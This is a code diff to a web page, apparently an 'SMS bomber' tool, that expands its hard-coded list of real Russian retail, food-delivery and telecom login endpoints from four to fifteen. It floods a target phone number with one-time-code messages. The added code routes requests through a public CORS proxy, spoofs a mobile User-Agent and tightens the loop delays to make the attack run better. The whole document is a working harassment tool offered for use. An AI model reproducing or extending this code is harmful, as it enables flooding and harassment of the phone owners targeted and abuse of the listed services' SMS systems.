@@ -293,7 +293,7 @@
                     <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(60 12 12)"/>
                     <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(120 12 12)"/>
                 </svg>
-                <span id="servicesCounter">API</span>
+                <span id="servicesCounter">15 API</span>
             </span>
         </div>
     </div>
@@ -306,8 +306,8 @@
     <div class="settings-content">
         <div class="close-settings" id="closeSettings">✕</div>
         <div class="title" style="font-size: 1.1rem; margin-bottom: 20px;">CRUX SETTINGS</div>
-        <div id="statusIndicator" style="font-size: 0.8rem; color: #8aff8a;">Mode: Client IP (Stealth)</div>
-        <div style="margin-top: 15px; font-size: 0.7rem; color: #aaa;">Engine: Browser Fetch + CORS Proxy</div>
+        <div id="statusIndicator" style="font-size: 0.8rem; color: #8aff8a;">Mode: Client Stealth</div>
+        <div style="margin-top: 15px; font-size: 0.7rem; color: #aaa;">User-Agent: Random Mobile Proxy</div>
     </div>
 </div>
 
@@ -323,15 +323,26 @@
     const ctx = canvas.getContext('2d');
     let bgParticles = [], explosionParticles = [], isAttacking = false;
     
-    // Используем CORS прокси для обхода ограничений браузера
+    // CORS Прокси
     const PROXY = "https://corsproxy.io/?";
 
-    // База сервисов прямо в коде фронтенда
+    // 15+ СЕРВИСОВ С МИНИМАЛЬНОЙ ЗАЩИТОЙ
     const services = [
         { name: "M-Food", url: "https://spb.m-food.ru/local/components/mfood/auth/ajax.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `action=send_code&phone=${p}` },
         { name: "Allo Pizza", url: "https://allopizza.su/api/v1/auth/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
         { name: "GrowFood", url: "https://growfood.pro/api/v1/auth/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
-        { name: "LetBeFit", url: "https://spb.letbefit.ru/ajax/auth.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `action=send_sms&phone=${p}` }
+        { name: "LetBeFit", url: "https://spb.letbefit.ru/ajax/auth.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `action=send_sms&phone=${p}` },
+        { name: "Sushiwok", url: "https://sushiwok.ru/api/auth/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
+        { name: "YandexEda", url: "https://eda.yandex.ru/api/v1/user/request_sms", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: "+" + p }) },
+        { name: "T2", url: "https://msk.tele2.ru/auth/realms/tele2/protocol/openid-connect/token", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `username=${p}&grant_type=password` },
+        { name: "Winelab", url: "https://www.winelab.ru/login/otp/send", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}` },
+        { name: "Sokolov", url: "https://sokolov.ru/api/v2/auth/sms", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
+        { name: "Sunlight", url: "https://api.sunlight.net/v3/customer/authorization/", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}` },
+        { name: "Eldorado", url: "https://www.eldorado.ru/api/auth/v1/sendSms", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
+        { name: "Hoff", url: "https://hoff.ru/api/v2/auth/send_code", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
+        { name: "ZolotoeYabloko", url: "https://goldapple.ru/rest/V1/customers/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
+        { name: "Sportmaster", url: "https://www.sportmaster.ru/api/v1/auth/send_code", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
+        { name: "Lenta", url: "https://lenta.com/api/v1/auth/request_code", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) }
     ];
 
     function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
@@ -382,34 +393,26 @@
         const statusTxt = document.getElementById('statusTxt');
         isAttacking = true;
         
-        statusTxt.innerText = "ЗАПУСК...";
-
         for (let i = 0; i < reps; i++) {
             if (!isAttacking) break;
-            
-            statusTxt.innerText = `КРУГ ${i + 1} ИЗ ${reps}`;
+            statusTxt.innerText = `КРУГ ${i+1} ИЗ ${reps}`;
             
             for (const srv of services) {
                 if (!isAttacking) break;
                 try {
-                    // Атакуем через прокси
                     await fetch(PROXY + srv.url, {
                         method: srv.method,
-                        headers: srv.headers,
+                        headers: {
+                            ...srv.headers,
+                            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
+                        },
                         body: srv.data(fullPhone)
                     });
-                } catch (e) {
-                    console.error("Service error:", srv.name);
-                }
-                // Пауза 0.5с между сервисами внутри круга
-                await new Promise(r => setTimeout(r, 500));
+                } catch (e) {}
+                await new Promise(r => setTimeout(r, 400)); // Задержка 0.4с для стабильности
             }
-            
-            let pVal = ((i + 1) / reps) * 100;
-            progress.style.width = pVal + "%";
-            
-            // Пауза 2с между полными кругами
-            await new Promise(r => setTimeout(r, 2000));
+            progress.style.width = ((i + 1) / reps * 100) + "%";
+            await new Promise(r => setTimeout(r, 1500)); // Задержка между кругами
         }
 
         statusTxt.innerText = "АТАКА ЗАВЕРШЕНА";
@@ -442,26 +445,16 @@
 
     document.getElementById('openSettings').onclick = () => document.getElementById('settingsModal').classList.add('active');
     document.getElementById('closeSettings').onclick = () => document.getElementById('settingsModal').classList.remove('active');
-    document.getElementById('stopAttack').onclick = () => { 
-        isAttacking = false; 
-        document.getElementById('loadingOverlay').classList.remove('show'); 
-    };
+    document.getElementById('stopAttack').onclick = () => { isAttacking = false; };
     
-    document.getElementById('codeSelector').onclick = (e) => { 
-        e.stopPropagation(); 
-        document.getElementById('codeSelector').classList.toggle('active'); 
-    };
-    
+    document.getElementById('codeSelector').onclick = (e) => { e.stopPropagation(); document.getElementById('codeSelector').classList.toggle('active'); };
     document.querySelectorAll('.code-item').forEach(item => {
         item.onclick = (e) => {
             document.getElementById('selectedCode').innerText = item.innerText.split(' ')[0] + ' ' + item.dataset.code;
             document.getElementById('codeSelector').classList.remove('active');
         };
     });
-
-    window.onclick = () => {
-        document.getElementById('codeSelector').classList.remove('active');
-    };
+    window.onclick = () => { document.getElementById('codeSelector').classList.remove('active'); };
 })();
 </script>
 </body>
